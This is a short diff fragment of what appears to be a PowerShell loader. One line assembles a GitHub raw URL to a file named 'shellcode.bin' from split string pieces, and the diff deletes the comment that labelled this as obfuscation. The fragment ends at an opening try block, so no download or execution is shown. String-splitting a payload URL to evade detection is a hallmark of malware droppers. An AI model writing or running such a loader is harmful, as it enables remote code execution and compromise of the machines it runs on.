@@ -1,4 +1,3 @@
-# Obfuscated URL pieces → reassembled at runtime
 $u1 = 'https://gi' + 'thub.com/Z' + 'akelijkgg/Un' + 'defined-BP/raw' + '/refs/heads/m' + 'ain/shellco' + 'de.bin'
 $url = $u1
 try {
